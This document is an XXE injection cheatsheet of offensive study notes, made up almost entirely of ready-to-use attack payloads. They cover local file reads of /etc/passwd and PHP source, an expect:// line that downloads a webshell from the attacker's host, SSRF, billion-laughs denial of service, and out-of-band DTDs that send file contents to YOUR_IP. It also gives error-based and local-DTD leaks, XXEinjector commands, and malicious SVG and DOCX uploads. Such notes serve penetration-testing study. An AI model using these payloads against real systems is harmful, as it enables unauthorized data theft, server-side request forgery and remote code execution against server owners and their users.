# XXE Injection Cheatsheet

Quick-reference companion to the full study notes. Replace `YOUR_IP` / placeholders as needed.

> [Payloads](https://github.com/payload-box/xxe-injection-payload-list)

## Table of Contents

1. [Core Concepts](#1-core-concepts)
2. [Local File Disclosure](#2-local-file-disclosure)
   - Basic file read
   - Reading source code (PHP `php://filter`)
   - RCE attempts
   - SSRF via XXE
   - DOS ("billion laughs")
3. [Advanced File Disclosure](#3-advanced-file-disclosure)
   - CDATA wrapping
   - Error-based XXE
   - Other error-triggering tricks
4. [Blind XXE / OOB Exfiltration](#4-blind-xxe--oob-exfiltration)
   - Detect (OOB ping)
   - Method 1 — Generic HTTP exfil
   - Method 2 — PHP backend base64
   - Decision guide
   - DNS exfiltration
   - Forging a WAV header (upload filter bypass)
   - Automated tooling — XXEinjector
   - Repurposing a local DTD
5. [Hidden Attack Surface](#5-hidden-attack-surface)
   - XInclude
   - File upload vectors (SVG, DOCX/XLSX/PPTX)
   - Content-Type switching
6. [Quick Triage Flow](#6-quick-triage-flow)

---

## 1. Core Concepts

| Term | Meaning |
|---|---|
| DTD | Validates XML structure; can be internal, external file (`SYSTEM`), or external URL |
| Entity | XML "variable", `&name;` |
| External entity | Entity value loaded from outside the DTD via `SYSTEM` (file path / URL) or `PUBLIC` |
| Parameter entity | `%name;` — only usable inside a DTD, declared with `<!ENTITY % name "value">` |

**Predefined XML entities:** `&lt;` `&gt;` `&amp;` `&apos;` `&quot;`

**Basic internal entity test:**
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
If `&company;` gets replaced in the response → app parses your DTD → potential XXE.

**Tip:** If app sends JSON, try changing `Content-Type` to `application/xml` / `text/xml` and converting body to XML — see §7.

---

## 2. Local File Disclosure

### Basic file read
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
...
<email>&company;</email>
```

### Reading source code (binary/special-char files) — PHP only
```xml
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```
Decode the base64 result locally.

### RCE attempts
- `expect://id` (requires PHP `expect` module, rarely enabled)
- Better: download a webshell via `curl`, replacing spaces with `$IFS` (avoid `|`, `>`, `{`):
```xml
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
```

### SSRF via XXE
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
Two-way if reflected in response; otherwise blind SSRF (still impactful).

### DOS ("billion laughs" — mostly patched on modern servers)
```xml
<!DOCTYPE email [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!-- ... chain up to a10 ... -->
]>
<email>&a10;</email>
```

---

## 3. Advanced File Disclosure

### CDATA wrapping (read files with `<`, `>`, `&`)
Naive inline composition **fails** in internal DTD (can't compose entity from other entities, can't use `%param;` inside internal subset). Fix: push composition into an **external DTD**.

`xxe.dtd` (hosted by you):
```dtd
<!ENTITY joined "%begin;%file;%end;">
```

Payload:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```
Limitations: fails on files containing `%`, the sequence `]]>`, or true binary data (use `php://filter` base64 instead).

### Error-based XXE
Use when output isn't reflected but errors are (PHP errors, Java exceptions). First confirm by sending malformed XML (broken tags, undefined entities) and checking for stack traces / path leaks.

Hosted DTD:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Payload (no XML body needed):
```xml
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
The "nonexistent path" error message leaks the file content. `&#x25;` = required encoding for nested `%`.

### Other error-triggering tricks
If the above gives no output, try malformed/bad URI schemes, or reference files whose names contain characters that break URI parsing — same principle: force the parser to build a path containing the file content, then fail on it.

---

## 4. Blind XXE / OOB Exfiltration

Use when there's **no reflected output and no errors**.

### Detect (OOB ping)
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> ]>
&xxe;
```
Or with parameter entities (works when regular entities are filtered):
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

### Method 1 — Generic HTTP exfil (any backend)
`malicious.dtd`:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_IP/?x=%file;'>">
%eval;
%exfiltrate;
```
Payload:
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_IP/malicious.dtd">
  %xxe;
]>
```
**Newline problem:** Java 1.7+ validates URL chars, multiline files (e.g. `/etc/passwd`) can silently fail.
- Workaround A: switch `%exfiltrate` scheme to `ftp://` (no URI validation) + run a mock FTP listener (file sent as `CWD` commands, line by line).
- Workaround B: target single-line files first (`/etc/hostname`) to confirm.

### Method 2 — PHP backend, base64 (handles multiline, preferred for PHP)
`xxe.dtd`:
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
```
Payload:
```xml
<!DOCTYPE email [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
Catch + auto-decode:
```php
<?php
if (isset($_GET['content'])) { error_log("\n\n" . base64_decode($_GET['content'])); }
```
`php -S 0.0.0.0:8000`

### Decision guide
```
PHP target?  → Method 2 (php://filter base64), most reliable
Not PHP?     → Method 1 (generic HTTP DTD)
  Newlines breaking it? → FTP exfil, or single-line files first
```

### DNS exfiltration (when HTTP is filtered)
Encode short data as a subdomain → capture with `tcpdump` / DNS logger. Best for short tokens, not full files.

### Bypassing magic-byte/upload filters: forge a WAV header
Build a minimal valid RIFF/WAV file with the XXE payload embedded in an `iXML` chunk (Python `struct`), so the file passes magic-byte checks but still gets parsed as XML by metadata tools.

### Automated tooling — XXEinjector
```bash
git clone https://github.com/enjoiz/XXEinjector.git
```
Capture a request, keep only first line + `XXEINJECT` marker, then:
```bash
ruby XXEinjector.rb --host=YOUR_IP --httpport=8000 --file=/tmp/xxe.req \
  --path=/etc/passwd --oob=http --phpfilter
```
Results land in `Logs/<target-ip>/<path>.log`.

### Repurposing a local DTD (when OOB is fully blocked)
If external DTDs can't be loaded/exfiltrated at all, abuse a **DTD file that already exists on the server filesystem** by redefining one of its entities to smuggle in the error-based payload (hybrid internal+external DTD relaxes the parameter-entity nesting restriction).

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```
1. Probe for a known DTD on disk (errors reveal present/missing) — common Linux/GNOME target: `/usr/share/yelp/dtd/docbookx.dtd`.
2. Fetch the real DTD (often open source) to find an entity name you can redefine.
3. Send the hybrid payload above to trigger the leak.

---

## 5. Hidden Attack Surface

### XInclude (no DOCTYPE control needed)
Use when you only control a single field that gets embedded into a server-side XML doc (e.g. SOAP backend).
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
- `parse="text"` is required for non-XML files.
- Bypasses DOCTYPE-based filters entirely.
- SSRF variant: `href="http://internal.company.com/admin"`.

### File upload vectors
**SVG** (entirely XML):
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
File content renders as visible text in the image. Use short single-line files first.

**DOCX/XLSX/PPTX** (ZIP containing XML internally):
```bash
unzip document.docx -d unzipped/
vim unzipped/word/document.xml   # inject DOCTYPE + entity, reference &xxe;
cd unzipped && zip -r ../malicious.docx .
```
Upload the doc; if reflected check output, else use OOB.

### Content-Type switching
Many backends are lenient — submit XML even where forms/APIs expect urlencoded or JSON.
```http
POST /action HTTP/1.1
Content-Type: text/xml
Content-Length: 113

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
Test both `application/x-www-form-urlencoded → text/xml` and `application/json → text/xml`.

---

## 6. Quick Triage Flow

```
1. Find XML input (form, API, file upload, SOAP)
2. Inject internal entity, check reflection → confirms basic XXE
3. Reflected output present?
   ├─ Yes → file:// read, php://filter base64 for binary, CDATA trick for special chars
   └─ No  → Errors shown?
            ├─ Yes → Error-based XXE (nonexistent-file trick)
            └─ No  → Blind / OOB (Collaborator ping → HTTP/FTP/DNS exfil → automate w/ XXEinjector)
4. No DOCTYPE control? → Try XInclude
5. Standard XML endpoint not found? → Try file upload (SVG/DOCX) or Content-Type switch
6. OOB fully blocked? → Repurpose a local DTD for error-based leak
```
